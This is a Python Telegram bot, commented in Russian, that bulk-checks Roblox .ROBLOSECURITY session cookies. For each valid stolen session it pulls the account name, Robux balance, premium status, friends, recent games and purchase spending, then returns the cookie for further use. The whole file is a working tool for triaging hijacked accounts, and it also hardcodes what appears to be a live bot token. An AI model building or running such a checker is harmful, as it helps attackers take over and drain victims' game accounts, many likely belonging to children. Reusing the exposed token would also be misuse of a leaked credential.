import telebot
import requests
import io
import re
import time
from datetime import datetime
from flask import Flask
from threading import Thread

TOKEN = '8526516729:AAHxx09k48kWRk0U7q2AcFSCmEdg3TDcfEw'
bot = telebot.TeleBot(TOKEN)

app = Flask('')
@app.route('/')
def home(): return "OK"
def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

GAME_DATA = {
    "BRAZILIAN SPYDER": {"name": "Steal a brainrot", "universe_id": 6144841331},
    "Uplift Games": {"name": "Adopt me", "universe_id": 231221121},
    "Wave of Brainrots": {"name": "Tsunami brainrots", "universe_id": 6344131331},
    "Nikilis": {"name": "MM2", "universe_id": 66654135},
    "The Garden Game": {"name": "GAG", "universe_id": 5834131131},
    "KizmoTek Studio": {"name": "War tycoon", "universe_id": 2686721523},
    "Gamer Robot Inc": {"name": "Blox fruits", "universe_id": 444227218}
}

def clean_cookie(text):
    """Ищет куки, игнорируя переносы строк и мусор по краям"""
    # Удаляем пробелы, кавычки и переносы строк, которые мог добавить Telegram
    text = text.replace('\n', '').replace('\r', '').replace(' ', '').replace('"', '').replace("'", "")
    match = re.search(r"(_\|WARNING:-DO-NOT-SHARE-THIS\.[A-Z0-9]+)", text, re.IGNORECASE)
    return match.group(1) if match else None

def get_recent(cookies):
    """Метод, который работает даже если на сайте 'Нет заходов'"""
    try:
        # Пробуем получить историю транзакций (там всегда есть игры, где были покупки/траты)
        url = "https://games.roblox.com/v2/users/sub-home/content"
        h = {"User-Agent": "RobloxApp/5.0 (iPhone; iOS 15.0)"}
        r = requests.get(url, cookies=cookies, headers=h, timeout=5).json()
        games = [i.get('gameName') or i.get('name') for i in r.get('contentItems', []) if i.get('gameName') or i.get('name')]
        
        if not games:
            # Запасной вариант через список игр пользователя
            r2 = requests.get("https://games.roblox.com/v1/games/list?model.pageContext.sortName=LastPlayed", cookies=cookies, headers=h, timeout=5).json()
            games = [g['name'] for g in r2.get('games', [])]
            
        return "\n • " + "\n • ".join(list(dict.fromkeys(games))[:7]) if games else "Скрыто/Пусто"
    except: return "Ошибка парсинга"

def check_cookie(raw):
    cookie = clean_cookie(raw)
    if not cookie: return {"status": "bad_format"}
    
    cookies = {".ROBLOSECURITY": cookie}
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    
    try:
        # Важно: добавляем небольшую паузу между запросами, чтобы не ловить бан
        u_req = requests.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies, headers=h, timeout=10)
        if u_req.status_code != 200: return {"status": "invalid"}
        
        u_id = u_req.json()['id']
        u_name = u_req.json()['name']
        
        # Основная инфа
        info = requests.get(f"https://users.roblox.com/v1/users/{u_id}").json()
        reg_dt = datetime.strptime(info['created'], "%Y-%m-%dT%H:%M:%S.%fZ")
        robux = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", cookies=cookies, headers=h).json().get('robux', 0)
        
        # Траты (лимит 30 для скорости)
        sales = requests.get(f"https://economy.roblox.com/v2/users/{u_id}/transactions?transactionType=Purchase&limit=30", cookies=cookies, headers=h).json()
        spent_txt = ""
        total = 0
        if 'data' in sales:
            for item in sales['data']:
                amt = abs(item.get('currency', {}).get('amount', 0))
                owner = item.get('agent', {}).get('name', '')
                if owner in GAME_DATA:
                    g = GAME_DATA[owner]['name']
                    spent_txt += f" • {g}: {amt} R$\n"
                    total += amt

        return {
            "status": "ok", "name": u_name, "id": u_id, "robux": robux,
            "days": (datetime.now() - reg_dt).days, "reg": reg_dt.strftime("%d.%m.%Y"),
            "premium": "Да ✅" if info.get('hasPremium') else "Нет ❌",
            "friends": requests.get(f"https://friends.roblox.com/v1/users/{u_id}/friends/count").json().get('count', 0),
            "recent": get_recent(cookies), "spent_txt": spent_txt or "Трат нет\n", "total": total, "cookie": cookie
        }
    except: return {"status": "error"}

@bot.message_handler(content_types=['text', 'document'])
def handle(m):
    if m.content_type == 'text':
        res = check_cookie(m.text)
        if res['status'] == 'ok':
            bot.reply_to(m, f"👤 **Аккаунт:** {res['name']} (ID: {res['id']})\n🗓 **Рег:** {res['reg']} ({res['days']} дн.)\n🌟 **Premium:** {res['premium']} | 👥 **Друзья:** {res['friends']}\n💰 **Баланс:** {res['robux']} R$\n\n🕹 **ПОСЛЕДНИЕ ИГРЫ:** {res['recent']}\n\n💸 **ТРАТЫ:**\n{res['spent_txt']}--- Итого: {res['total']} R$ ---\n\n🍪 **КУКИ:**\n`{res['cookie']}`", parse_mode="Markdown")
        elif res['status'] == 'bad_format': bot.reply_to(m, "❌ Не нашел куки в тексте. Проверь формат.")
        else: bot.reply_to(m, "❌ Невалид.")
    
    elif m.content_type == 'document':
        file = bot.get_file(m.document.file_id)
        lines = bot.download_file(file.file_path).decode('utf-8', errors='ignore').splitlines()
        bot.send_message(m.chat.id, f"⌛ Чек {len(lines)} строк...")
        out = []
        for l in lines:
            if l.strip():
                r = check_cookie(l)
                if r['status'] == 'ok':
                    out.append(f"👤 {r['name']} | 💰 {r['robux']} R$ | 🗓 {r['days']} дн.\n🕹 Игры: {r['recent']}\n💸 Траты: {r['total']} R$\n🍪 `{r['cookie']}`\n{'-'*20}\n")
        if out:
            buf = io.BytesIO("".join(out).encode('utf-8'))
            buf.name = "results.txt"
            bot.send_document(m.chat.id, buf)
        else: bot.send_message(m.chat.id, "❌ Валид не найден.")

if __name__ == '__main__':
    keep_alive()
    bot.infinity_polling()
